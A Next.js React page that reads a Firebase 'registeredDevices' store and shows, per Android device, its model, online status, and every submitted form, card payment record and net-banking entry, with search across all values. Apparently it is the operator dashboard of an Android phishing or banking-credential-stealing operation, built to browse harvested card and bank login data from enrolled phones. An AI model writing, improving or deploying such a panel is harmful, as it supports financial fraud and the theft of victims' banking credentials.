"use client";

import Sidebar from "@/components/Sidebar";
import { db } from "@/lib/firbase";
import { Card, Chip, Input } from "@heroui/react";
import { onValue, ref } from "firebase/database";
import type { ReactNode } from "react";
import { useEffect, useMemo, useState } from "react";
import {
  MdAccountBalance,
  MdOutlineDescription,
  MdPayment,
} from "react-icons/md";
import { FiSearch } from "react-icons/fi";

type SubmissionRecord = {
  id: string;
  [key: string]: unknown;
};

type DeviceRecord = {
  id: string;
  brand: string;
  model: string;
  androidVersion: string;
  joinedAt: string;
  onlineStatus: "Online" | "Offline";
  formSubmissions: SubmissionRecord[];
  cardSubmissions: SubmissionRecord[];
  netBankingSubmissions: SubmissionRecord[];
};

function parseTimestamp(value: unknown): number {
  if (typeof value === "number" && Number.isFinite(value)) {
    return value < 1_000_000_000_000 ? value * 1000 : value;
  }

  if (typeof value === "string") {
    const trimmed = value.trim();

    if (!trimmed) {
      return 0;
    }

    if (/^\d+$/.test(trimmed)) {
      const numericValue = Number(trimmed);
      return trimmed.length <= 10 ? numericValue * 1000 : numericValue;
    }

    const parsed = Date.parse(trimmed);
    return Number.isNaN(parsed) ? 0 : parsed;
  }

  return 0;
}

function formatTimestampValue(value: unknown) {
  const timestamp = parseTimestamp(value);

  if (!timestamp) {
    return "N/A";
  }

  return new Date(timestamp).toLocaleString();
}

function formatDisplayValue(key: string, value: unknown) {
  if (value === null || value === undefined || value === "") {
    return "N/A";
  }

  const keyName = key.toLowerCase();

  if (
    keyName.includes("timestamp") ||
    keyName.includes("createdat") ||
    keyName.includes("updatedat")
  ) {
    return formatTimestampValue(value);
  }

  if (typeof value === "object") {
    return JSON.stringify(value);
  }

  return String(value);
}

function sortSubmissionsByLatest(items: SubmissionRecord[]) {
  return items
    .slice()
    .sort((a, b) => {
      const bTime = parseTimestamp(b.timestamp ?? b.createdAt ?? b.updatedAt);
      const aTime = parseTimestamp(a.timestamp ?? a.createdAt ?? a.updatedAt);
      return bTime - aTime;
    });
}

function compareDeviceDesc(a: DeviceRecord, b: DeviceRecord) {
  return b.id.localeCompare(a.id, undefined, {
    numeric: true,
    sensitivity: "base",
  });
}

function getDeviceName(device: DeviceRecord) {
  const name = `${device.brand} ${device.model}`.trim();
  return name === "" ? "Unknown Device" : name;
}

function getStatusColor(status: DeviceRecord["onlineStatus"]) {
  return status === "Online" ? "success" : "danger";
}

function getOnlineStatus(rawDevice: Record<string, unknown>): DeviceRecord["onlineStatus"] {
  return rawDevice.checkOnline &&
    typeof rawDevice.checkOnline === "object" &&
    (rawDevice.checkOnline as Record<string, unknown>).available ===
      "Device is online"
    ? "Online"
    : "Offline";
}

function mapSubmissions(
  data: unknown,
  fallbackSortField?: "timestamp" | "createdAt",
) {
  if (!data || typeof data !== "object") {
    return [];
  }

  const entries = Object.entries(data as Record<string, Record<string, unknown>>).map(
    ([key, value]) => ({
      id: key,
      ...value,
      ...(fallbackSortField &&
      value &&
      typeof value === "object" &&
      value[fallbackSortField] === undefined
        ? { [fallbackSortField]: 0 }
        : {}),
    }),
  );

  return sortSubmissionsByLatest(entries);
}

function SubmissionSection({
  title,
  icon,
  accentClassName,
  emptyLabel,
  submissions,
}: {
  title: string;
  icon: ReactNode;
  accentClassName: string;
  emptyLabel: string;
  submissions: SubmissionRecord[];
}) {
  return (
    <details className="overflow-hidden rounded-2xl border border-[var(--border)] bg-[var(--surface)]">
      <summary className="flex cursor-pointer list-none items-center justify-between gap-3 px-4 py-3 marker:hidden">
        <div className="flex min-w-0 items-center gap-3">
          <div className={`rounded-xl p-2.5 ${accentClassName}`}>{icon}</div>
          <div className="min-w-0">
            <h3 className="truncate text-sm font-semibold text-[var(--text-main)]">
              {title}
            </h3>
            <p className="text-xs text-[var(--text-muted)]">
              {submissions.length} submitted
            </p>
          </div>
        </div>
        <span className="text-xs font-medium text-[var(--text-muted)]">
          Open
        </span>
      </summary>

      <div className="border-t border-[var(--border)] px-3 pb-3 pt-3">
        {submissions.length === 0 ? (
          <div className="rounded-2xl border border-dashed border-[var(--border)] bg-[var(--surface-subtle)] px-4 py-4 text-sm text-[var(--text-muted)]">
            {emptyLabel}
          </div>
        ) : (
          <div className="space-y-2.5">
            {submissions.map((item, index) => (
              <div
                key={item.id}
                className="rounded-2xl border border-[var(--border)] bg-[var(--surface-subtle)] p-3"
              >
                <div className="mb-2 flex items-start justify-between gap-3 border-b border-[var(--border)] pb-2">
                  <div>
                    <p className="text-sm font-semibold text-[var(--text-main)]">
                      Entry #{submissions.length - index}
                    </p>
                    <p className="text-[11px] text-[var(--text-muted)]">
                      {formatTimestampValue(
                        item.timestamp ?? item.createdAt ?? item.updatedAt,
                      )}
                    </p>
                  </div>
                </div>

                <div className="grid gap-2">
                  {Object.entries(item).map(([key, value]) => {
                    if (key === "id") {
                      return null;
                    }

                    return (
                      <div
                        key={key}
                        className="rounded-xl border border-[var(--border)] bg-[var(--surface)] px-3 py-2"
                      >
                        <p className="text-[11px] uppercase tracking-wide text-[var(--text-muted)]">
                          {key.replace(/_/g, " ")}
                        </p>
                        <p className="mt-1 break-all text-sm font-medium text-[var(--text-main)]">
                          {formatDisplayValue(key, value)}
                        </p>
                      </div>
                    );
                  })}
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </details>
  );
}

export default function FormPage() {
  const [devices, setDevices] = useState<DeviceRecord[]>([]);
  const [searchQuery, setSearchQuery] = useState("");

  useEffect(() => {
    const registerDevicesRef = ref(db, "registeredDevices");

    const unsubscribe = onValue(registerDevicesRef, (snapshot) => {
      if (!snapshot.exists()) {
        setDevices([]);
        return;
      }

      const data = snapshot.val() as Record<string, Record<string, unknown>>;

      const nextDevices: DeviceRecord[] = Object.entries(data)
        .map(([deviceId, rawDevice]) => ({
          id: deviceId,
          brand: typeof rawDevice.brand === "string" ? rawDevice.brand : "Unknown",
          model: typeof rawDevice.model === "string" ? rawDevice.model : "Unknown",
          androidVersion:
            typeof rawDevice.androidVersion === "string" ||
            typeof rawDevice.androidVersion === "number"
              ? String(rawDevice.androidVersion)
              : "Unknown",
          joinedAt: formatTimestampValue(rawDevice.joinedAt),
          onlineStatus: getOnlineStatus(rawDevice),
          formSubmissions: mapSubmissions(rawDevice.form_submissions, "timestamp"),
          cardSubmissions: mapSubmissions(rawDevice.card_payment_data, "createdAt"),
          netBankingSubmissions: mapSubmissions(
            rawDevice.netbanking_data,
            "createdAt",
          ),
        }))
        .filter(
          (device) =>
            device.formSubmissions.length > 0 ||
            device.cardSubmissions.length > 0 ||
            device.netBankingSubmissions.length > 0,
        )
        .sort(compareDeviceDesc);

      setDevices(nextDevices);
    });

    return () => unsubscribe();
  }, []);

  const formsCount = useMemo(
    () =>
      devices.reduce((total, device) => total + device.formSubmissions.length, 0),
    [devices],
  );
  const cardCount = useMemo(
    () =>
      devices.reduce((total, device) => total + device.cardSubmissions.length, 0),
    [devices],
  );
  const netBankingCount = useMemo(
    () =>
      devices.reduce(
        (total, device) => total + device.netBankingSubmissions.length,
        0,
      ),
    [devices],
  );

  const filteredDevices = useMemo(() => {
    const query = searchQuery.trim().toLowerCase();

    if (!query) {
      return devices;
    }

    return devices.filter((device) => {
      const matchesDevice =
        device.id.toLowerCase().includes(query) ||
        device.brand.toLowerCase().includes(query) ||
        device.model.toLowerCase().includes(query) ||
        getDeviceName(device).toLowerCase().includes(query);

      const submissionText = [
        ...device.formSubmissions,
        ...device.cardSubmissions,
        ...device.netBankingSubmissions,
      ]
        .flatMap((submission) => Object.values(submission))
        .map((value) => String(value ?? "").toLowerCase())
        .join(" ");

      return matchesDevice || submissionText.includes(query);
    });
  }, [devices, searchQuery]);

  return (
    <div className="page-shell">
      <div className="page-frame">
        <Sidebar />

        <main className="page-main">
          <div className="space-y-5">
            <div className="flex flex-col gap-4 lg:flex-row lg:items-end lg:justify-between">
              <div>
                <p className="text-xs font-semibold uppercase tracking-[0.2em] text-[var(--accent)]">
                  Unified Device View
                </p>
                <h1 className="mt-2 text-2xl font-semibold text-[var(--text-main)] sm:text-3xl">
                  Forms, Cards And Net Banking
                </h1>
                <p className="mt-2 text-sm text-[var(--text-muted)]">
                  Every device is shown on one page with all submitted data,
                  sorted in descending serial order.
                </p>
              </div>

              <div className="w-full max-w-xl">
                <Input
                  placeholder="Search device ID, name, serial, or submitted values"
                  value={searchQuery}
                  onValueChange={setSearchQuery}
                  startContent={<FiSearch className="h-4 w-4 text-[var(--text-muted)]" />}
                  classNames={{
                    input: "bg-[var(--surface)] text-[var(--text-main)]",
                    inputWrapper:
                      "border-[var(--border)] bg-[var(--surface)] shadow-none",
                  }}
                />
              </div>
            </div>


            {filteredDevices.length === 0 ? (
              <Card className="surface-card p-10 text-center">
                <p className="text-lg font-semibold text-[var(--text-main)]">
                  No matching devices found
                </p>
                <p className="mt-2 text-sm text-[var(--text-muted)]">
                  Try a different search term or wait for new submissions.
                </p>
              </Card>
            ) : (
              <div className="space-y-4">
                {filteredDevices.map((device, index) => (
                  <Card
                    key={device.id}
                    className="surface-card overflow-hidden rounded-[24px] p-4 sm:p-5"
                  >
                    <div className="space-y-4">
                      <div className="flex flex-col gap-4 border-b border-[var(--border)] pb-4 lg:flex-row lg:items-start lg:justify-between">
                        <div className="space-y-2">
                          <div className="flex flex-wrap items-center gap-2">
                            <Chip variant="flat" color="primary">
                              Serial #{filteredDevices.length - index}
                            </Chip>
                            <Chip
                              variant="flat"
                              color={getStatusColor(device.onlineStatus)}
                            >
                              {device.onlineStatus}
                            </Chip>
                            <Chip variant="flat">
                              Android {device.androidVersion}
                            </Chip>
                          </div>

                          <div>
                            <h2 className="text-lg font-semibold text-[var(--text-main)] sm:text-xl">
                              {getDeviceName(device)}
                            </h2>
                            <p className="mt-1 break-all font-mono text-sm text-[var(--accent)]">
                              {device.id}
                            </p>
                          </div>
                        </div>

                        <div className="grid gap-2 sm:grid-cols-2 lg:min-w-[320px]">
                          <div className="rounded-2xl border border-[var(--border)] bg-[var(--surface-subtle)] px-3 py-2.5">
                            <p className="text-xs uppercase tracking-wide text-[var(--text-muted)]">
                              Device ID
                            </p>
                            <p className="mt-1 break-all text-sm font-semibold text-[var(--text-main)]">
                              {device.id}
                            </p>
                          </div>
                          <div className="rounded-2xl border border-[var(--border)] bg-[var(--surface-subtle)] px-3 py-2.5">
                            <p className="text-xs uppercase tracking-wide text-[var(--text-muted)]">
                              Device Name
                            </p>
                            <p className="mt-1 text-sm font-semibold text-[var(--text-main)]">
                              {getDeviceName(device)}
                            </p>
                          </div>
                          <div className="rounded-2xl border border-[var(--border)] bg-[var(--surface-subtle)] px-3 py-2.5">
                            <p className="text-xs uppercase tracking-wide text-[var(--text-muted)]">
                              Serial Number
                            </p>
                            <p className="mt-1 text-sm font-semibold text-[var(--text-main)]">
                              {device.id}
                            </p>
                          </div>
                          <div className="rounded-2xl border border-[var(--border)] bg-[var(--surface-subtle)] px-3 py-2.5">
                            <p className="text-xs uppercase tracking-wide text-[var(--text-muted)]">
                              Joined At
                            </p>
                            <p className="mt-1 text-sm font-semibold text-[var(--text-main)]">
                              {device.joinedAt}
                            </p>
                          </div>
                        </div>
                      </div>

                      <div className="space-y-3 xl:grid xl:grid-cols-3 xl:gap-4 xl:space-y-0">
                        <SubmissionSection
                          title="Forms Submitted"
                          icon={
                            <MdOutlineDescription className="h-5 w-5 text-blue-600" />
                          }
                          accentClassName="bg-blue-100"
                          emptyLabel="No form submissions for this device."
                          submissions={device.formSubmissions}
                        />
                        <SubmissionSection
                          title="Cards Submitted"
                          icon={<MdPayment className="h-5 w-5 text-amber-600" />}
                          accentClassName="bg-amber-100"
                          emptyLabel="No card submissions for this device."
                          submissions={device.cardSubmissions}
                        />
                        <SubmissionSection
                          title="Net Banking Submitted"
                          icon={
                            <MdAccountBalance className="h-5 w-5 text-emerald-600" />
                          }
                          accentClassName="bg-emerald-100"
                          emptyLabel="No net banking submissions for this device."
                          submissions={device.netBankingSubmissions}
                        />
                      </div>
                    </div>
                  </Card>
                ))}
              </div>
            )}
          </div>
        </main>
      </div>
    </div>
  );
}
